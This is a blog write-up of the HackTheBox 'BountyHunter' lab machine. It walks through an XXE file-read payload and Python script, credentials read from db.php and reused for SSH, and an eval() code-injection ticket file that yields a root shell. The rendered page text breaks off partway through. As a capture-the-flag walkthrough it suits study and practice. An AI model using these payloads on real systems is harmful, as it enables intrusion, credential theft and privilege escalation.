<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - BountyHunter | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.
Skills Learned XXE attack Code injection Tools Nmap Burp Suite Reconnaissance Nmap A full tcp scan with nmap reveals two open ports: SSH and an Apache web server."><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/bountyhunter/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - BountyHunter"><meta property="og:description" content="BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.
Skills Learned XXE attack Code injection Tools Nmap Burp Suite Reconnaissance Nmap A full tcp scan with nmap reveals two open ports: SSH and an Apache web server."><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/bountyhunter/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/bountyhunter/imgs/image-20211124153121545.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-11-22T21:31:31+07:00"><meta property="article:modified_time" content="2021-11-22T21:31:31+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/bountyhunter/imgs/image-20211124153121545.png"><meta name=twitter:title content="HackTheBox - BountyHunter"><meta name=twitter:description content="BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.
Skills Learned XXE attack Code injection Tools Nmap Burp Suite Reconnaissance Nmap A full tcp scan with nmap reveals two open ports: SSH and an Apache web server."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - BountyHunter","item":"https://fahmifj.github.io/hackthebox/bountyhunter/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - BountyHunter","name":"HackTheBox - BountyHunter","description":"BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.\nSkills Learned XXE attack Code injection Tools Nmap Burp Suite Reconnaissance Nmap A full tcp scan with nmap reveals two open ports: SSH and an Apache web server.","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.\nSkills Learned XXE attack Code injection Tools Nmap Burp Suite Reconnaissance Nmap A full tcp scan with nmap reveals two open ports: SSH and an Apache web server.\n→ kali@kali «bountyhunter» «10.10.14.23» $ nmap -p- --min-rate 1000 -oA nmap/10-tcp-allport-bounty 10.10.11.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 12:49 EDT Nmap scan report for 10.10.11.100 Host is up (0.060s latency). Not shown: 65533 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 48.51 seconds → kali@kali «bountyhunter» «10.10.14.23» $ nmap -sC -sV -p22,80 --min-rate 1000 -oA nmap/10-tcp-allport-script-bounty 10.10.11.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 12:52 EDT Nmap scan report for 10.10.11.100 Host is up (0.055s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds Enumeration TCP 80 - Website Visiting port 80 shows a portfolio website that is similar with one of the HTB web challenges: Freelancer.\nClicking on portal redirects to /portal.php, and the page is under development.\nClicking the ‘here’ text points to /log_submit.php. There is a form there and I can submit some inputs.\nBy observing the traffic, I can see that the form data is submitted to trackerdiRbpr00f314.php.\nIt seems the submitted data is converted to an xml document and encoded in base64\n→ kali@kali «bountyhunter» «10.10.14.29» $ echo 'PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5kZG9zPC90aXRsZT4KCQk8Y3dlPmN3ZS01MDA8L2N3ZT4KCQk8Y3Zzcz4xMDwvY3Zzcz4KCQk8cmV3YXJkPjEkPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+' | base64 -d \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e ddos cwe-500 10 1$ Further observation reveals a web directory which has directory listing enabled.\nThe contents of readme.txt contains some to do list.\nFoothold XXE PoC Seeing XML document submitted in base64 encoded leads to an assumption of XXE attack. I will use the following payload to test the attack.\n→ kali@kali «exploits» «10.10.14.29» $ cat xxe1.test \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003c!DOCTYPE bugreport [\u003c!ENTITY passwd SYSTEM \"file:///etc/passwd\" \u003e] \u003e \u003cspan class=\"p\"\u003e\u0026\u003c/span\u003epasswd\u003cspan class=\"p\"\u003e; cwe-500 10 1$ → kali@kali «exploits» «10.10.14.29» $ cat xxe1.test | base64 -w 0 PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbPCFFTlRJVFkgcGFzc3dkIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA+XSA+CjxidWdyZXBvcnQ+CiA8dGl0bGU+JnBhc3N3ZDs8L3RpdGxlPgogPGN3ZT5jd2UtNTAwPC9jd2U+CiA8Y3Zzcz4xMDwvY3Zzcz4KIDxyZXdhcmQ+MSQ8L3Jld2FyZD4KPC9idWdyZXBvcnQ+Cg== I will intercept the submit request and put my payload there.\nPOST /tracker_diRbPr00f314.php HTTP/1.1 Host: 10.10.11.100 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 323 Origin: http://10.10.11.100 Connection: close Referer: http://10.10.11.100/log_submit.php data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbPCFFTlRJVFkgcGFzc3dkIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA%2bXSA%2bCjxidWdyZXBvcnQ%2bCiA8dGl0bGU%2bJnBhc3N3ZDs8L3RpdGxlPgogPGN3ZT5jd2UtNTAwPC9jd2U%2bCiA8Y3Zzcz4xMDwvY3Zzcz4KIDxyZXdhcmQ%2bMSQ8L3Jld2FyZD4KPC9idWdyZXBvcnQ%2bCg%3d%3d When I submit, it returns with:\nIt was vulnerable!\nShell as Development File Read I created a Python script to exploit the XXE and grab the file contents.\nimport requests import sys try: file_to_read = sys.argv[1] except IndexError: print('[-] Usage: %s ' % sys.argv[0]) sys.exit(-1) target_url = \"http://10.10.11.100/tracker_diRbPr00f314.php\" proxies = { \"http\": \"http://127.0.0.1:8080\" } from base64 import b64encode xxe_payload = f\"\"\" \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003c!DOCTYPE bugreport [\u003c!ENTITY xxe SYSTEM \"file://{file_to_read}\" \u003e] \u0026xxe; cwe-500 10 1$ \"\"\" xxe_payload_b64 = b64encode(xxe_payload.strip().encode('ascii')).decode('UTF-8') #print(f\"[+] Crafted payload \\n{xxe_payload_b64}\") data = { 'data': xxe_payload_b64 } xxe_resp = requests.post(target_url, data=data, proxies=proxies, verify=False) if \"cwe-500\" not in xxe_resp.text: print(\"[-] Something went wrong\") sys.exit(-1) from bs4 import BeautifulSoup soup = BeautifulSoup(xxe_resp.text, features=\"lxml\") output = [tag.text for tag in soup.find_all(\"td\")] print(output[1]) But when I try to use this script to read PHP files, it fails\n→ kali@kali «exploits» «10.10.14.29» $ python3 bountyhunters_xxe.py /var/www/html/index.php [-] Something went wrong This time I modified the script and used the PHP wrapper.\n...[SNIP]... \u003c!DOCTYPE bugreport [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource={file_to_read}\" \u003e] \u003e ...[SNIP]... from bs4 import BeautifulSoup soup = BeautifulSoup(xxe_resp.text, features=\"lxml\") output = [tag.text for tag in soup.find_all(\"td\")] from base64 import b64decode print(b64decode(output[1]).decode('UTF-8')) And it worked.\n→ kali@kali «exploits» «10.10.14.29» $ python3 bountyhunters_xxe_filter.py /var/www/html/tracker_diRbPr00f314.php \u003c?php if(isset($_POST['data'])) { $xml = base64_decode($_POST['data']); libxml_disable_entity_loader(false); $dom = new DOMDocument(); $dom-\u003eloadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); $bugreport = simplexml_import_dom($dom); } ?\u003e If DB were ready, would have added: Title: \u003c?php echo $bugreport-\u003etitle; ?\u003e CWE: \u003c?php echo $bugreport-\u003ecwe; ?\u003e Score: \u003c?php echo $bugreport-\u003ecvss; ?\u003e Reward: \u003c?php echo $bugreport-\u003ereward; ?\u003e There is a database connection file (/var/www/html/db.php) that contains DB credentials.\n→ kali@kali «exploits» «10.10.14.29» $ python3 bountyhunters_xxe_filter.py /var/www/html/db.php \u003c?php // TODO -\u003e Implement login system with the database. $dbserver = \"localhost\"; $dbname = \"bounty\"; $dbusername = \"admin\"; $dbpassword = \"m19RoAU0hP41A1sTsq6K\"; $testuser = \"test\"; ?\u003e SSH The database password works on user development (from /etc/passwd).\nkali@kali «exploits» «10.10.14.29» $ ssh development@10.10.11.100 development@10.10.11.100's password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) ...[SNIP]... System information as of Fri 30 Jul 2021 03:28:24 PM UTC System load: 0.0 Usage of /: 38.4% of 6.83GB Memory usage: 30% Swap usage: 0% Processes: 214 Users logged in: 1 IPv4 address for eth0: 10.10.11.100 IPv6 address for eth0: dead:beef::250:56ff:feb9:cb7f ...[SNIP]... Last login: Fri Jul 30 13:44:59 2021 from 10.10.14.42 development@bountyhunter:~$ id uid=1000(development) gid=1000(development) groups=1000(development) Privilege Escalation Shell as root Enumeration At current home directory, there are some plain text files.\ndevelopment@bountyhunter:~$ ls -l total 12 -rw-r--r-- 1 root root 471 Jun 15 16:10 contract.txt -r--r----- 1 root development 33 Jul 30 05:20 user.txt The content of contract.txt.\ndevelopment@bountyhunter:~$ cat contract.txt Hey team, I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed. This has been our first job since the \"rm -rf\" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why. I set up the permissions for you to test this. Good luck. -- John This user also has sudo permissions on the mentioned internal tool called ticketValidator.py.\ndevelopment@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Source Analysis ticketValidator.py:\n#Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(\".md\"): return open(loc, 'r') else: print(\"Wrong file type.\") exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\"# Skytrain Inc\"): return False continue if i == 1: if not x.startswith(\"## Ticket to \"): return False print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue if x.startswith(\"__Ticket Code:__\"): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\"**\"): return False ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\"**\", \"\")) if validationNumber \u003e 100: return True else: return False return False def main(): fileName = input(\"Please enter the path to the ticket file.\\n\") ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\"Valid ticket.\") else: print(\"Invalid ticket.\") ticket.close main() I’m bad at python, but I can see where is the goal from that script, it’s this line\nvalidationNumber = eval(x.replace(\"**\", \"\")) So the flow is: ask a file -\u003e load the file (markdown extension) -\u003e some unique evaluation -\u003e eval function.\ndef main(): fileName = input(\"Please enter the path to the ticket file.\\n\") ticket = load_file(fileName) result = evaluate(ticket) if (result): print(\"Valid ticket.\") else: print(\"Invalid ticket.\") ticket.close Exploitation To exploit this script, I can just create a md file, and the first three line are:\n# Skytrain Inc ## Ticket to me __Ticket Code:__ Now in the fourth line, I can inject a Python code such as:\n**32+0==32 and __import__('os').system('cat /root/root.txt') As long as the number has 4 as the remainder when mod by 7, it can pass these lines and it will be eval-ed and executed as 32+0==32 and __import__('os').system('cat /root/root.txt').\nif code_line and i == code_line: if not x.startswith(\"**\"): return False # [\"32\", \"0==32 and __import__('os').system('cat /root/root.txt')\"] ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] # 32 if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\"**\", \"\")) os.system([command]) returns value of 0 if the execution is success.\nThe complete file:\ndevelopment@bountyhunter:/dev/shm$ cat iamf.md # Skytrain Inc ## Ticket to me __Ticket Code:__ **32+0==32 and __import__('os').system('cat /root/root.txt') Now I can run and supply my ticket file.\ndevelopment@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. iamf.md Destination: me 70cfb26382b7af00c95360e142894b1f Invalid ticket. For shell, I can just change the fourth line to execute bash.\n**32+0==32 and __import__('os').system('/bin/bash') And done.\ndevelopment@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. iamf.md Destination: me root@bountyhunter:/dev/shm# id uid=0(root) gid=0(root) groups=0(root) root@bountyhunter:/dev/shm# ls -l /root/ total 8 -r-------- 1 root root 33 Jul 30 16:38 root.txt drwxr-xr-x 3 root root 4096 Apr 5 22:48 snap root@bountyhunter:/dev/shm# ","wordCount":"1471","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/bountyhunter/imgs/image-20211124153121545.png","datePublished":"2021-11-22T21:31:31+07:00","dateModified":"2021-11-22T21:31:31+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/bountyhunter/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - BountyHunter</h1><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>November 22, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>7 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#xxe aria-label=XXE>XXE</a></li><li><a href=#shell-as-development aria-label="Shell as Development">Shell as Development</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/bountyhunter/imgs/image-20211124153121545_huf081adfdbfa88bd832be3c443c9c0c7c_134943_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/bountyhunter/imgs/image-20211124153121545_huf081adfdbfa88bd832be3c443c9c0c7c_134943_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/bountyhunter/imgs/image-20211124153121545_huf081adfdbfa88bd832be3c443c9c0c7c_134943_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/bountyhunter/imgs/image-20211124153121545.png 875w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/bountyhunter/imgs/image-20211124153121545.png alt width=875 height=645></figure><p>BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>XXE attack</li><li>Code injection</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Burp Suite</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>A full tcp scan with <code>nmap</code> reveals two open ports: SSH and an Apache web server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «bountyhunter» «10.10.14.23» 
</span></span><span class=line><span class=cl>$ nmap -p- --min-rate <span class=m>1000</span> -oA nmap/10-tcp-allport-bounty 10.10.11.100
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-07-29 12:49 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.100
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.060s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp open  ssh
</span></span><span class=line><span class=cl>80/tcp open  http
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 48.51 seconds
</span></span><span class=line><span class=cl>→ kali@kali «bountyhunter» «10.10.14.23» 
</span></span><span class=line><span class=cl>$ nmap -sC -sV -p22,80 --min-rate <span class=m>1000</span> -oA nmap/10-tcp-allport-script-bounty 10.10.11.100
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-07-29 12:52 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.100
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.055s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Bounty Hunters
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 9.30 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>Visiting port 80 shows a portfolio website that is similar with one of the HTB web challenges: <a href=https://app.hackthebox.com/challenges/freelancer>Freelancer</a>.</p><p><div class=img-container><img src=imgs/image-20210730203525289.png alt=image-20210730203525289 title="Websites view"></div></p><p>Clicking on portal redirects to <code>/portal.php</code>, and the page is under development.</p><p><div class=img-container><img src=imgs/image-20210730204150975.png alt=image-20210730204150975></div></p><p>Clicking the &lsquo;here&rsquo; text points to <code>/log_submit.php</code>. There is a form there and I can submit some inputs.</p><p><div class=img-container><img src=imgs/image-20210730205749566.png alt=image-20210730205749566></div></p><p>By observing the traffic, I can see that the form data is submitted to <code>trackerdiRbpr00f314.php</code>.</p><p><div class=img-container><img src=imgs/image-20210730204826225.png alt=image-20210730204826225></div></p><p>It seems the submitted data is converted to an xml document and encoded in base64</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «bountyhunter» «10.10.14.29» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5kZG9zPC90aXRsZT4KCQk8Y3dlPmN3ZS01MDA8L2N3ZT4KCQk8Y3Zzcz4xMDwvY3Zzcz4KCQk8cmV3YXJkPjEkPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+&#39;</span> <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>&lt;?xml  <span class=nv>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=nv>encoding</span><span class=o>=</span><span class=s2>&#34;ISO-8859-1&#34;</span>?&gt;
</span></span><span class=line><span class=cl>                &lt;bugreport&gt;
</span></span><span class=line><span class=cl>                &lt;title&gt;ddos&lt;/title&gt;
</span></span><span class=line><span class=cl>                &lt;cwe&gt;cwe-500&lt;/cwe&gt;
</span></span><span class=line><span class=cl>                &lt;cvss&gt;10&lt;/cvss&gt;
</span></span><span class=line><span class=cl>                &lt;reward&gt;1$&lt;/reward&gt;
</span></span><span class=line><span class=cl>                &lt;/bugreport&gt;
</span></span></code></pre></div><p>Further observation reveals a web directory which has directory listing enabled.</p><p><div class=img-container><img src=imgs/image-20210730204030384.png alt=image-20210730204030384></div></p><p>The contents of <code>readme.txt</code> contains some to do list.</p><p><div class=img-container><img src=imgs/image-20210730203939994.png alt=image-20210730203939994></div></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=xxe>XXE<a class=anchor aria-hidden=true href=#xxe>#</a></h3><h4 id=poc>PoC<a class=anchor aria-hidden=true href=#poc>#</a></h4><p>Seeing XML document submitted in base64 encoded leads to an assumption of XXE attack. I will use the following payload to test the attack.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class=line><span class=cl>$ cat xxe1.test 
</span></span><span class=line><span class=cl>&lt;?xml  <span class=nv>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=nv>encoding</span><span class=o>=</span><span class=s2>&#34;ISO-8859-1&#34;</span>?&gt;
